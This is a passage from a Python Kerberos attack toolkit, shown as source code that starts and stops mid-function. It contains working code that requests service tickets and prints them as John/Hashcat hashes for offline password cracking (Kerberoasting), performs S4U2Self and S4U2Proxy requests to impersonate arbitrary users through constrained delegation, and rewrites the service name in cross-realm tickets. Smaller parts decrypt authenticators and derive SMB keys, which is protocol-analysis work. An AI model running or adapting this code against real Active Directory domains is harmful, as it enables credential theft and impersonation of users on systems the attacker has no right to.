		endTime = datetime.datetime.strptime (str (TGSRepPart['endtime']), "%Y%m%d%H%M%SZ")
		if "renew-till" in TGSRepPart:
			renewTill = datetime.datetime.strptime (str (TGSRepPart['renew-till']), "%Y%m%d%H%M%SZ")
		else:
			renewTill = "<Empty>"
		srealm = TGSRepPart['srealm']
		sname = [str (name) for name in TGSRepPart['sname']['name-string']]
		if "caddr" in TGSRepPart and len (TGSRepPart['caddr']) > 0:
			caddr = binascii.hexlify(TGSRepPart['caddr'][0]['address'].asOctets()).decode()
		else:
			caddr = '<Empty>'
		if "encrypted_pa_data" in TGSRepPart and len (TGSRepPart['encrypted_pa_data']) > 0:
			encPAData = binascii.hexlify(TGSRepPart['encrypted_pa_data'][0]['padata-value'].asOctets()).decode()
		else:
			encPAData = '<Empty>'
		print ("[+] Client-to-Service Session Key = {}".format (sessionKey))
		print ("[+] UTC Last request time = {}".format (lastReq))
		print ("[+] Nonce = {}".format (nonce))
		print ("[+] UTC Key expiration time = {}".format (keyExpiration))
		print ("[+] Flags = ({}) {}".format (hex(flagsDecoded), ", ".join(flags)))
		print ("[+] UTC Authentication time = {}".format (authTime))
		print ("[+] UTC Start time = {}".format (startTime))
		print ("[+] UTC End time = {}".format (endTime))
		print ("[+] UTC End renew time = {}".format (renewTill))
		print ("[+] Realm = {}".format (srealm))
		print ("[+] Sname = {}".format (sname))
		print ("[+] Client address = {}".format (caddr))
		print ("[+] Encrypted PA_DATA = {}".format (encPAData))

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def doKRBTGSREQ(kdcHost, servicePrincipal, domain, kdcRep, cipher, clientTGSSessionKey, kerberoast):

	# Decode the KDC-REP: Should be AS-REP but can be also TGS_REP in case of cross domain/forest request
	
	try:
		decodedKDCREP = decoder.decode(kdcRep, asn1Spec = AS_REP())[0]
	except:
		decodedKDCREP = decoder.decode(kdcRep, asn1Spec = TGS_REP())[0]

	domain = domain.upper()
	
	# Build PA-TGS-REQ: Ticket and Authenticator
	
	ticket = TicketObj()
	ticket.from_asn1(decodedKDCREP['ticket'])
	apReq = AP_REQ()
	apReq['pvno'] = 5
	apReq['msg-type'] = int(ApplicationTagNumbers.AP_REQ.value)
	opts = list()
	apReq['ap-options'] = encodeFlags(opts)
	seq_set(apReq, 'ticket', ticket.to_asn1)

	authenticator = Authenticator()
	authenticator['authenticator-vno'] = 5
	authenticator['crealm'] = decodedKDCREP['crealm'].asOctets()
	clientName = PrincipalObj()
	clientName.from_asn1(decodedKDCREP, 'crealm', 'cname')
	seq_set(authenticator, 'cname', clientName.components_to_asn1)
	now = datetime.datetime.utcnow()
	authenticator['cusec'] =  now.microsecond
	authenticator['ctime'] = KerberosTimeObj.to_asn1(now)
	encodedAuthenticator = encoder.encode(authenticator)
	KEYUSAGE = 7
	encryptedEncodedAuthenticator = cipher.encrypt(clientTGSSessionKey, 7, None, encodedAuthenticator)
	apReq['authenticator'] = noValue
	apReq['authenticator']['etype'] = cipher.encType
	apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
	encodedApReq = encoder.encode(apReq)

	# Build KRB_TGS_REQ: PADATA and REQ-BODY

	krbTGSREQ = TGS_REQ()

	krbTGSREQ['pvno'] =  5
	krbTGSREQ['msg-type'] = int(ApplicationTagNumbers.TGS_REQ.value)
	krbTGSREQ['padata'] = noValue
	krbTGSREQ['padata'][0] = noValue
	krbTGSREQ['padata'][0]['padata-type'] = int(PreAuthenticationDataTypes.PA_TGS_REQ.value)
	krbTGSREQ['padata'][0]['padata-value'] = encodedApReq

	reqBody = seq_set(krbTGSREQ, 'req-body')
	opts = list()
	opts.append(KDCOptionsVals.forwardable.value)
	opts.append(KDCOptionsVals.renewable.value)
	opts.append(KDCOptionsVals.canonicalize.value)
	reqBody['kdc-options'] = encodeFlags(opts)
	seq_set(reqBody, 'sname', servicePrincipal.components_to_asn1)
	reqBody['realm'] = domain
	now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)
	reqBody['till'] = KerberosTimeObj.to_asn1(now)
	reqBody['nonce'] = random.getrandbits(31)
	seq_set_iter(reqBody, 'etype', (int(EncryptionTypes.rc4_hmac.value), int(EncryptionTypes.des3_cbc_sha1_kd.value), int(EncryptionTypes.des_cbc_md5.value), int(cipher.encType)))

	# Send KRB_TGS_REQ
 
	message = encoder.encode(krbTGSREQ)
	r = sendReceive(message, domain, kdcHost)

	# Decode and parse KRB_TGS_REP

	tgsRep = decoder.decode(r, asn1Spec = TGS_REP())[0]
	cipherText = tgsRep['enc-part']['cipher']
	KEYUSAGE = 8
	plainText, confounder = cipher.decrypt(clientTGSSessionKey, 8, cipherText)
	encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
	clientServiceSessionKey = encTGSRepPart['key']['keyvalue'].asOctets()
	cipher = ENCTYPE_TABLE[encTGSRepPart['key']['keytype']]
	print(f"\t[+] Client-to-Service Session Key = {binascii.hexlify(clientServiceSessionKey).decode()}")

	# Check if we get the requested serviceName: If not this is for another KDC

	spn = PrincipalObj()
	spn.from_asn1(tgsRep['ticket'], 'realm', 'sname')

	if spn.components[0] == servicePrincipal.components[0]:
		if kerberoast != None:
			# Output the ST encrypted part in John/Hashcat format for cracking

			if tgsRep['ticket']['enc-part']['etype'] == int(EncryptionTypes.rc4_hmac.value):
				print("\t[+] Hash (John/Hashcat format) = $krb5tgs$%d$*%s$%s$%s*$%s$%s" % (EncryptionTypes.rc4_hmac.value, kerberoast, domain,
														f"{domain.lower()}/{kerberoast}",
														binascii.hexlify(tgsRep['ticket']['enc-part']['cipher'].asOctets()[:16]).decode(),
														binascii.hexlify(tgsRep['ticket']['enc-part']['cipher'].asOctets()[16:]).decode()))
			else:
				print("\t[+] Hash (John/Hashcat format) = $krb5tgs$%d$%s$%s$*%s*$%s$%s" % (tgsRep['ticket']['enc-part']['etype'], kerberoast, domain,
														f"{domain.lower()}/{kerberoast}",
														binascii.hexlify(tgsRep['ticket']['enc-part']['cipher'].asOctets()[-12:]).decode(),
														binascii.hexlify(tgsRep['ticket']['enc-part']['cipher'].asOctets()[:-12:]).decode()))

		return r, cipher, clientTGSSessionKey, clientServiceSessionKey
	else:
		domain = spn.components[1]
		print(f"\t[+] Send cross domain/forest request for domain {domain.upper()}")

		return doKRBTGSREQ(domain, servicePrincipal, domain, r, cipher, clientServiceSessionKey, kerberoast)

def doS4U2ProxyWithAdditionalTicket(domain, kdcHost, asRep, serviceName, cipher, clientTGSSessionKey, additionalTicket):
	# Get TGT and ST

	decodedASREP = decoder.decode(asRep, asn1Spec = AS_REP())[0]
	TGT = TicketObj()
	TGT.from_asn1(decodedASREP['ticket'])
 
	print(f"\t[+] Using additional ST '{additionalTicket}' instead of S4U2Self")
	ccache = CCache.loadFile(additionalTicket)
	creds = ccache.credentials[0]
	rawTicket = creds.toTGSREP()
	decodedTGSREP = decoder.decode(rawTicket['KDC_REP'], asn1Spec = TGS_REP())[0]
	clientServiceSessionKey = rawTicket['sessionKey'].contents
	print(f"\t[+] Client-to-Service Session Key = {binascii.hexlify(clientServiceSessionKey).decode()}")
	ST = TicketObj()
	ST.from_asn1(decodedTGSREP['ticket'])

	# Build AP-REQ and add TGT

	apReq = AP_REQ()
	apReq['pvno'] = 5
	apReq['msg-type'] = int(ApplicationTagNumbers.AP_REQ.value)
	opts = list()
	apReq['ap-options'] = encodeFlags(opts)
	seq_set(apReq, 'ticket', TGT.to_asn1)

	# Build authenticator and encrypt authenticator
 
	authenticator = Authenticator()
	authenticator['authenticator-vno'] = 5
	authenticator['crealm'] = str(decodedASREP['crealm'])
	clientName = PrincipalObj()
	clientName.from_asn1(decodedASREP, 'crealm', 'cname')
	seq_set(authenticator, 'cname', clientName.components_to_asn1)
	now = datetime.datetime.utcnow()
	authenticator['cusec'] = now.microsecond
	authenticator['ctime'] = KerberosTimeObj.to_asn1(now)
	encodedAuthenticator = encoder.encode(authenticator)
	KEYUSAGE = 7
	encryptedEncodedAuthenticator = cipher.encrypt(clientTGSSessionKey, KEYUSAGE, None, encodedAuthenticator)

	# Add authenticator to AP-REQ

	apReq['authenticator'] = noValue
	apReq['authenticator']['etype'] = cipher.encType
	apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

	encodedApReq = encoder.encode(apReq)

	# Build KRB_TGS_REQ

	krbTGSREQ = TGS_REQ()
	krbTGSREQ['pvno'] = 5
	krbTGSREQ['msg-type'] = int(ApplicationTagNumbers.TGS_REQ.value)
	krbTGSREQ['padata'] = noValue
	krbTGSREQ['padata'][0] = noValue
	krbTGSREQ['padata'][0]['padata-type'] = int(PreAuthenticationDataTypes.PA_TGS_REQ.value)
	krbTGSREQ['padata'][0]['padata-value'] = encodedApReq

	# Add PA-PAC-OPTIONS to PADATA

	paPacOptions = PA_PAC_OPTIONS()
	paPacOptions['flags'] = encodeFlags((PAPacOptions.resource_based_constrained_delegation.value,))

	krbTGSREQ['padata'][1] = noValue
	krbTGSREQ['padata'][1]['padata-type'] = PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
	krbTGSREQ['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

	# Build REQ-BODY

	reqBody = seq_set(krbTGSREQ, 'req-body')
	opts = list()
	# This specified we're doing S4U2Proxy
	opts.append(KDCOptionsVals.cname_in_addl_tkt.value)
	opts.append(KDCOptionsVals.canonicalize.value)
	opts.append(KDCOptionsVals.forwardable.value)
	opts.append(KDCOptionsVals.renewable.value)
	reqBody['kdc-options'] = encodeFlags(opts)
	service2 = PrincipalObj(serviceName, type = PrincipalNameType.NT_SRV_INST.value)
	seq_set(reqBody, 'sname', service2.components_to_asn1)
	reqBody['realm'] = domain
	# Add ST to additional tickets field
	seq_set_iter(reqBody, 'additional-tickets', (ST.to_asn1(Ticket()),))
	now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)
	reqBody['till'] = KerberosTimeObj.to_asn1(now)
	reqBody['nonce'] = random.getrandbits(31)
	seq_set_iter(reqBody, 'etype', (int(EncryptionTypes.rc4_hmac.value), int(EncryptionTypes.des3_cbc_sha1_kd.value), int(EncryptionTypes.des_cbc_md5.value), int(cipher.encType)))

	# Send KRB_TGS_REQ and receive KRB_TGS_REP

	message = encoder.encode(krbTGSREQ)
	print('\t[+] Using S4U2Proxy')
	r = sendReceive(message, domain, kdcHost)
 
	# Decode and parse KRB_TGS_REP

	decodedTGSREP = decoder.decode(r, asn1Spec = TGS_REP())[0]
	cipherText = decodedTGSREP['enc-part']['cipher']
	KEYUSAGE = 8
	plainText, confounder = cipher.decrypt(clientTGSSessionKey, 8, cipherText)
	encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
	clientServiceSessionKey = encTGSRepPart['key']['keyvalue'].asOctets()
	print(f"\t[+] Client-to-Service Session Key = {binascii.hexlify(clientServiceSessionKey).decode()}")

	return r, None, clientTGSSessionKey, clientServiceSessionKey

def doS4U(domain, kdcHost, username, impersonateName, asRep, serviceName, cipher, clientTGSSessionKey, self, u2u, noPAFORUSER = False):
	# Extract TGT from AS-REP
	
	decodedASREP = decoder.decode(asRep, asn1Spec = AS_REP())[0]
	ticket = TicketObj()
	ticket.from_asn1(decodedASREP['ticket'])

	# Build AP-REQ and add TGT

	apReq = AP_REQ()
	apReq['pvno'] = 5
	apReq['msg-type'] = int(ApplicationTagNumbers.AP_REQ.value)
	opts = list()
	apReq['ap-options'] = encodeFlags(opts)
	seq_set(apReq, 'ticket', ticket.to_asn1)

	# Build authenticator and encrypt It with Client-to-TGS Session Key

	authenticator = Authenticator()
	authenticator['authenticator-vno'] = 5
	authenticator['crealm'] = str(decodedASREP['crealm'])
	clientName = PrincipalObj()
	clientName.from_asn1(decodedASREP, 'crealm', 'cname')
	seq_set(authenticator, 'cname', clientName.components_to_asn1)
	now = datetime.datetime.utcnow()
	authenticator['cusec'] = now.microsecond
	authenticator['ctime'] = KerberosTimeObj.to_asn1(now)
	encodedAuthenticator = encoder.encode(authenticator)
	KEYUSAGE = 7
	encryptedEncodedAuthenticator = cipher.encrypt(clientTGSSessionKey, 7, None, encodedAuthenticator)

	# Add encrypted authenticator to AP-REQ

	apReq['authenticator'] = noValue
	apReq['authenticator']['etype'] = cipher.encType
	apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator
	encodedApReq = encoder.encode(apReq)

	# Build KRB_TGS_REQ and add AP-REQ
 
	krbTGSREQ = TGS_REQ()
	krbTGSREQ['pvno'] = 5
	krbTGSREQ['msg-type'] = int(ApplicationTagNumbers.TGS_REQ.value)
	krbTGSREQ['padata'] = noValue
	krbTGSREQ['padata'][0] = noValue
	krbTGSREQ['padata'][0]['padata-type'] = int(PreAuthenticationDataTypes.PA_TGS_REQ.value)
	krbTGSREQ['padata'][0]['padata-value'] = encodedApReq

	if (not noPAFORUSER):
		# Build PA-FOR-USER
	
		clientName = PrincipalObj(impersonateName, type = PrincipalNameType.NT_PRINCIPAL.value)
		S4UByteArray = pack('<I', PrincipalNameType.NT_PRINCIPAL.value)
		S4UByteArray += impersonateName.encode() + domain.encode() + b'Kerberos'
		MESSAGE_TYPE = 17
		checkSum = KERB_CHECKSUM_HMAC_MD5 (clientTGSSessionKey, MESSAGE_TYPE, S4UByteArray)
		paForUserEnc = PA_FOR_USER_ENC()
		seq_set(paForUserEnc, 'userName', clientName.components_to_asn1)
		paForUserEnc['userRealm'] = domain
		paForUserEnc['cksum'] = noValue
		paForUserEnc['cksum']['cksumtype'] = int(ChecksumTypes.hmac_md5.value)
		paForUserEnc['cksum']['checksum'] = checkSum
		paForUserEnc['auth-package'] = 'Kerberos'
		encodedPaForUserEnc = encoder.encode(paForUserEnc)

		# Add PA-FOR-USER to KRB_TGS_REQ

		krbTGSREQ['padata'][1] = noValue
		krbTGSREQ['padata'][1]['padata-type'] = int(PreAuthenticationDataTypes.PA_FOR_USER.value)
		krbTGSREQ['padata'][1]['padata-value'] = encodedPaForUserEnc

	# Build REQ-BODY of KRB_TGS_REQ

	reqBody = seq_set(krbTGSREQ, 'req-body')
	opts = list()
	opts.append(KDCOptionsVals.forwardable.value)
	opts.append(KDCOptionsVals.renewable.value)
	opts.append(KDCOptionsVals.canonicalize.value)
	if u2u: # U2U
		opts.append(KDCOptionsVals.renewable_ok.value)
		opts.append(KDCOptionsVals.enc_tkt_in_skey.value)
	reqBody['kdc-options'] = encodeFlags(opts)
	if u2u: # U2U
		serverName = PrincipalObj(username, domain, type = PrincipalNameType.NT_UNKNOWN.value)
	else:
		serverName = PrincipalObj(username, type = PrincipalNameType.NT_UNKNOWN.value)
	seq_set(reqBody, 'sname', serverName.components_to_asn1)
	reqBody['realm'] = str(decodedASREP['crealm'])
	now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)
	reqBody['till'] = KerberosTimeObj.to_asn1(now)
	reqBody['nonce'] = random.getrandbits(31)
	seq_set_iter(reqBody, 'etype', (int(cipher.encType), int(EncryptionTypes.rc4_hmac.value)))
	if u2u: # U2U
		seq_set_iter(reqBody, 'additional-tickets', (ticket.to_asn1(Ticket()),))

	# Send KRB_TGS_REQ and decode KRB_TGS_REP

	print('\t[+] Using S4U2Self%s' % ('+U2U' if u2u else ''))
	message = encoder.encode(krbTGSREQ)
	r = sendReceive(message, domain, kdcHost)
 
	# Decode and parse KRB_TGS_REP

	decodedTGSREP = decoder.decode(r, asn1Spec = TGS_REP())[0]
	cipherText = decodedTGSREP['enc-part']['cipher']
	KEYUSAGE = 8
	plainText, confounder = cipher.decrypt(clientTGSSessionKey, 8, cipherText)
	encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
	clientServiceSessionKey = encTGSRepPart['key']['keyvalue'].asOctets()
	print(f"\t[+] Client-to-Service Session Key = {binascii.hexlify(clientServiceSessionKey).decode()}")

	# If S4U2Self only we have done, otherwise continue with S4U2Proxy

	if self:
		return r, None, clientTGSSessionKey, clientServiceSessionKey

	# Get TGT and ST

	TGT = TicketObj()
	TGT.from_asn1(decodedASREP['ticket'])
	ST = TicketObj()
	ST.from_asn1(decodedTGSREP['ticket'])

	# Build AP-REQ and add TGT

	apReq = AP_REQ()
	apReq['pvno'] = 5
	apReq['msg-type'] = int(ApplicationTagNumbers.AP_REQ.value)
	opts = list()
	apReq['ap-options'] = encodeFlags(opts)
	seq_set(apReq, 'ticket', TGT.to_asn1)

	# Build authenticator and encrypt authenticator
 
	authenticator = Authenticator()
	authenticator['authenticator-vno'] = 5
	authenticator['crealm'] = str(decodedASREP['crealm'])
	clientName = PrincipalObj()
	clientName.from_asn1(decodedASREP, 'crealm', 'cname')
	seq_set(authenticator, 'cname', clientName.components_to_asn1)
	now = datetime.datetime.utcnow()
	authenticator['cusec'] = now.microsecond
	authenticator['ctime'] = KerberosTimeObj.to_asn1(now)
	encodedAuthenticator = encoder.encode(authenticator)
	KEYUSAGE = 7
	encryptedEncodedAuthenticator = cipher.encrypt(clientTGSSessionKey, KEYUSAGE, None, encodedAuthenticator)

	# Add authenticator to AP-REQ

	apReq['authenticator'] = noValue
	apReq['authenticator']['etype'] = cipher.encType
	apReq['authenticator']['cipher'] = encryptedEncodedAuthenticator

	encodedApReq = encoder.encode(apReq)

	# Build KRB_TGS_REQ

	krbTGSREQ = TGS_REQ()
	krbTGSREQ['pvno'] = 5
	krbTGSREQ['msg-type'] = int(ApplicationTagNumbers.TGS_REQ.value)
	krbTGSREQ['padata'] = noValue
	krbTGSREQ['padata'][0] = noValue
	krbTGSREQ['padata'][0]['padata-type'] = int(PreAuthenticationDataTypes.PA_TGS_REQ.value)
	krbTGSREQ['padata'][0]['padata-value'] = encodedApReq

	# Add PA-PAC-OPTIONS to PADATA

	paPacOptions = PA_PAC_OPTIONS()
	paPacOptions['flags'] = encodeFlags((PAPacOptions.resource_based_constrained_delegation.value,))

	krbTGSREQ['padata'][1] = noValue
	krbTGSREQ['padata'][1]['padata-type'] = PreAuthenticationDataTypes.PA_PAC_OPTIONS.value
	krbTGSREQ['padata'][1]['padata-value'] = encoder.encode(paPacOptions)

	# Build REQ-BODY

	reqBody = seq_set(krbTGSREQ, 'req-body')
	opts = list()
	# This specified we're doing S4U2Proxy
	opts.append(KDCOptionsVals.cname_in_addl_tkt.value)
	opts.append(KDCOptionsVals.canonicalize.value)
	opts.append(KDCOptionsVals.forwardable.value)
	opts.append(KDCOptionsVals.renewable.value)
	reqBody['kdc-options'] = encodeFlags(opts)
	service2 = PrincipalObj(serviceName, type = PrincipalNameType.NT_SRV_INST.value)
	seq_set(reqBody, 'sname', service2.components_to_asn1)
	reqBody['realm'] = domain
	# Add ST to additional tickets field
	seq_set_iter(reqBody, 'additional-tickets', (ST.to_asn1(Ticket()),))
	now = datetime.datetime.utcnow() + datetime.timedelta(days = 1)
	reqBody['till'] = KerberosTimeObj.to_asn1(now)
	reqBody['nonce'] = random.getrandbits(31)
	seq_set_iter(reqBody, 'etype', (int(EncryptionTypes.rc4_hmac.value), int(EncryptionTypes.des3_cbc_sha1_kd.value), int(EncryptionTypes.des_cbc_md5.value), int(cipher.encType)))

	# Send KRB_TGS_REQ and receive KRB_TGS_REP

	message = encoder.encode(krbTGSREQ)
	print('\t[+] Using S4U2Proxy')
	r = sendReceive(message, domain, kdcHost)
 
	# Decode and parse KRB_TGS_REP

	decodedTGSREP = decoder.decode(r, asn1Spec = TGS_REP())[0]
	cipherText = decodedTGSREP['enc-part']['cipher']
	KEYUSAGE = 8
	plainText, confounder = cipher.decrypt(clientTGSSessionKey, 8, cipherText)
	encTGSRepPart = decoder.decode(plainText, asn1Spec = EncTGSRepPart())[0]
	clientServiceSessionKey = encTGSRepPart['key']['keyvalue'].asOctets()
	print(f"\t[+] Client-to-Service Session Key = {binascii.hexlify(clientServiceSessionKey).decode()}")

	return r, None, clientTGSSessionKey, clientServiceSessionKey

def requestST(kdcHost, username, password, domain, ntHash, aesKey, ccache, certFile, pfxPwd, pemPrivKeyFile, serviceName, impersonateName, additionalTicket, self, u2u, noPAFORUSER, kerberoast, saveST = True, addToCCACHE = None, skipIntro = False):
	if not skipIntro:
		print_yellow("[*] Requesting ST to KDC")
		print_yellow("---")
		print()

	try:
		# Get a TGT to extract Client-to-TGS Session Key
		
		asRep = None
		cipher = None
		clientTGSSessionKey = None
		if ccache != None: # Is there a valid TGT ?
			if isKirbiFile(ccache):
				ccache = CCache.loadKirbiFile(ccache)
			elif isCCacheFile(ccache):
				ccache = CCache.loadFile(ccache)
			else:
				print(f"[-] Unknown file format '{ccache}'", file = sys.stderr)
				return
			
			foundTGT = False
			sName = f'krbtgt/{domain.lower()}'
			sRealm = domain.lower()
			for creds in ccache.credentials:
				ccServiceName = creds['server'].prettyPrint().split(b'@')[0].decode('utf-8')
				ccServiceRealm = creds['server'].prettyPrint().split(b'@')[1].decode('utf-8')
				if sName == ccServiceName.lower() and sRealm == ccServiceRealm.lower(): # Found a valid TGT
					foundTGT = True
					rawTicket = creds.toASREP()
					asRep, cipher, clientTGSSessionKey = rawTicket['KDC_REP'], rawTicket['cipher'], rawTicket['sessionKey'].contents
					userSecretKey = None
					break
			
			if not foundTGT:
				print(f"[-] No valid TGT found for {domain.upper()}", file = sys.stderr)
				return
			else:
				print("[+] Using provided credential file as TGT")
				print("\t[+] Client-to-TGS Session Key = {}".format(binascii.hexlify(clientTGSSessionKey).decode()))

		else: # No TGT, request It
			print("[+] Requesting TGT")
			try:
				asRep, cipher, userSecretKey, clientTGSSessionKey = requestTGT(kdcHost, username, password, domain, ntHash, aesKey, certFile, pfxPwd, pemPrivKeyFile, save = False, indent = 1)
			except:
				raise
			if asRep == None:
				return

		# We have the Client-to-TGS Session Key
		# Request ST
	
		print("[+] Requesting ST")
		serviceName = serviceName.lower()
		if impersonateName == None:
			servicePrincipal = PrincipalObj(serviceName, type = PrincipalNameType.NT_SRV_INST.value)
			tgsRep, cipher, clientTGSSessionKey, clientServiceSessionKey = doKRBTGSREQ(kdcHost, servicePrincipal, domain, asRep, cipher, clientTGSSessionKey, kerberoast)
		else:
			try:
				if additionalTicket != None:
					tgsRep, cipher, clientTGSSessionKey, clientServiceSessionKey = doS4U2ProxyWithAdditionalTicket(domain, kdcHost, asRep, serviceName, cipher, clientTGSSessionKey, additionalTicket)
				else:
					tgsRep, cipher, clientTGSSessionKey, clientServiceSessionKey = doS4U(domain, kdcHost, username, impersonateName, asRep, serviceName, cipher, clientTGSSessionKey, self, u2u, noPAFORUSER)
			except Exception as e:
				if str(e).find('KDC_ERR_S_PRINCIPAL_UNKNOWN') >= 0:
					print("\t[-] Probably user '%s' does not have constrained delegation permisions or impersonated user does not exist" % username, file = sys.stderr)
					return
				elif str(e).find('KDC_ERR_BADOPTION') >= 0:
					print("\t[-] Probably SPN is not allowed to delegate by user '%s' or ST not forwardable" % username, file = sys.stderr)
					return
				else:
					raise e
			username = impersonateName

		# Check CCACHE if cross domain/forest request
		# If so, set Credential Service Realm to the user's domain in uppercase
		# Otherwise Kerberos authentication with GSSAPI when using the ticket will failed
		
		ccache = CCache()
		ccache.fromTGSREP(tgsRep, clientTGSSessionKey)
		for x in range(len(ccache.credentials)):
			creds = ccache.credentials[x]

			rawTicket = creds.toTGSREP()
			decodedTicket = decoder.decode(rawTicket['KDC_REP'], asn1Spec = TGS_REP())[0]
		
			newDomain = creds['server'].realm['data']
			if newDomain.lower() != domain.lower(): # Cross request -> Fix It
				print(f'[+] Editing {serviceName}@{newDomain} to {serviceName}@{domain.upper()}')
				principal = Principal()
				principalObj = PrincipalObj(serviceName + "@" + domain.upper())
				principal.fromPrincipal(principalObj)
				creds['server'] = principal

				decodedTicket['ticket']['sname']['name-string'][0] = serviceName.split("/")[0]
				decodedTicket['ticket']['sname']['name-string'][1] = serviceName.split("/")[1]
				decodedTicket['ticket']['realm'] = newDomain.upper()
				creds.ticket = CountedOctetString()
				creds.ticket['data'] = encoder.encode(decodedTicket['ticket'].clone(tagSet = Ticket.tagSet, cloneValueFlag = True))
				creds.ticket['length'] = len(creds.ticket['data'])
				ccache.credentials[x] = creds

		if saveST:
			# Save ST
			creds = ccache.credentials[0]
			service_realm = creds['server'].realm['data']
			
			serviceClass = ''
			if len(creds['server'].components) == 2:
				serviceClass = creds['server'].components[0]['data']
				service_hostname = creds['server'].components[1]['data']
			else:
				service_hostname = creds['server'].components[0]['data']
			
			if len(serviceClass) == 0:
				service = "%s@%s" % (service_hostname, service_realm)
			else:
				service = "%s/%s@%s" % (serviceClass, service_hostname, service_realm)
			
			ccacheName = username + "@" + service.replace("/", "_").replace(':', '_') + '.ccache'

			if addToCCACHE == None: # Create a new CCACHE
				ccache.saveFile(ccacheName)
				print(f"[+] '{ccacheName}' saved")
			else: # Add ST to existing CCACHE
				ccache2 = CCache.loadFile(addToCCACHE)
				ccache2.credentials += ccache.credentials
				ccache2.saveFile(addToCCACHE)
				print(f"[+] ST added to '{addToCCACHE}'")

		return tgsRep, cipher, clientTGSSessionKey, clientServiceSessionKey
	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

###########################
### Application Service ###
###########################

def decryptAPREQAuthenticator(encType, hexClientServiceSessionKey, hexAuthenticatorCipher, hexASRepEncKey = ""):
	print_yellow("[*] Decrypting AP-REQ Authenticator")
	print_yellow("---")
	print()

	try:
		if encType == None or hexClientServiceSessionKey == None:
			print("[-] Encryption type and Client-to-Service Session Key required", file = sys.stderr)
			return

		KEYUSAGE = 11

		cipherDecrypted, confounder = ENCTYPE_TABLE[encType].decrypt(binascii.unhexlify (hexClientServiceSessionKey), KEYUSAGE, binascii.unhexlify (hexAuthenticatorCipher))
		authenticator = decoder.decode (cipherDecrypted, asn1Spec = Authenticator())[0]
		vno = authenticator['authenticator-vno']
		crealm = authenticator['crealm']
		cname = str(authenticator['cname'][1][0])
		if 'cksum' in authenticator:
			cksumType = str(authenticator['cksum']['cksumtype'])
			cksum = binascii.hexlify(authenticator['cksum']['checksum'].asOctets()).decode()
		else:
			cksum = "<Empty>"
		cusec = authenticator['cusec']
		ctime = datetime.datetime.strptime (str(authenticator['ctime']), "%Y%m%d%H%M%SZ")
		if 'subkey' in authenticator and authenticator['subkey'].isValue:
			subKeyType = authenticator['subkey']['keytype']
			subKey = binascii.hexlify(authenticator['subkey']['keyvalue'].asOctets()).decode()
		else:
			subKey = "<Empty>"
		if 'seq-number' in authenticator and authenticator['seq-number'].isValue:
			seqNumber = authenticator['seq-number']
		else:
			seqNumber = "<Empty>"
		if 'authorization-data' in authenticator and len(authenticator['authorization-data']) > 0:
			authDataType = authenticator['authorization-data'][0]['ad-type']
			authData = binascii.hexlify(authenticator['authorization-data'][0]['ad-data'].asOctets()).decode()
		else:
			authData = "<Empty>"
		print ("[+] Authenticator version number = {}".format (vno))
		print ("[+] Realm = {}".format (crealm))
		print ("[+] Client name = {}".format (cname))
		if cksum != "<Empty>":
			print ("[+] Checksum")
			print(f"\t[+] Checksum Type = {cksumType}")
			print(f"\t[+] Checksum Value = {cksum}")
		else:
			print("[+] Checksum = <Empty>")
		print ("[+] UTC Date = {}".format (ctime))
		print ("[+] UTC Date microseconds = {}".format (cusec))
		if subKey != "<Empty>":
			print ("[+] Subkey")
			print(f"\t[+] Subkey Type = {subKeyType}")
			print(f"\t[+] Subkey Value = {subKey}")
		else:
			print ("[+] Subkey = <Empty>")
		print ("[+] Sequence number = {}".format (seqNumber))
		if authData != "<Empty>":
			print ("[+] Authorization data")
			print(f"\t[+] Authorization data Type = {authDataType}")
			print(f"\t[+] Authorization data Value = {authData}")
		else:
			print ("[+] Authorization data = <Empty>")

	except KeyboardInterrupt:
		exit()
	except Exception as e:
		print(f"[-] Got error: {str(e)}", file = sys.stderr)
		print('---------------------------------', file = sys.stderr)
		traceback.print_exc()
		print('---------------------------------', file = sys.stderr)

def deriveKeySMB(hexClientServiceSessionKey, dialectSMB, hexPrevSMBPackets = "", indent = 0):
	if indent == 0:
		print_yellow("[*] Derive MasterKey2")
		print_yellow("---")
		print()

	try:
		if dialectSMB == None:
			print("\t" * indent + "[-] SMB Dialect required", file = sys.stderr)
			return ''

		def ComputePreAuthIntegrityHash (messages):
			preAuthIntegrityHash = "00" * 64
			for message in messages:
				toHash = preAuthIntegrityHash + message
				preAuthIntegrityHash = hashlib.sha512 (binascii.unhexlify (toHash)).hexdigest()
			return preAuthIntegrityHash

		def SMB3KDF (sessionKey, Label, Context):
			r = 32
			L = 128
			n = math.ceil (L / 256)
			if (n > ((2**r) - 1)):
				return ""
			res = ""
			for i in range (1, n+1):
				fixedInputData = binascii.unhexlify ("0" * ((r // 4) - len (hex (i)[2:])) + hex (i)[2:]) + Label + b"\x00" + Context + binascii.unhexlify ("0" * ((r // 4) - len (hex (L)[2:])) + hex (L)[2:])
				K = hmac.new (sessionKey, fixedInputData, "sha256").hexdigest()
				res += K
			return res[:r]

		if (dialectSMB == "2.0.2" or dialectSMB == "2.1"):
			KSign = hexClientServiceSessionKey
			KApp = hexClientServiceSessionKey
			print ("\t" * indent + "[+] Signing Key = {}".format (KSign))
			print ("\t" * indent + "[+] Application Key = {}".format (KApp))
			return KSign
		elif (dialectSMB == "3.0" or dialectSMB == "3.0.2"):
			KSign = SMB3KDF (binascii.unhexlify (hexClientServiceSessionKey), b"SMB2AESCMAC\x00", b"SmbSign\x00")
			KApp = SMB3KDF (binascii.unhexlify (hexClientServiceSessionKey), b"SMB2APP\x00", b"SmbRpc\x00")
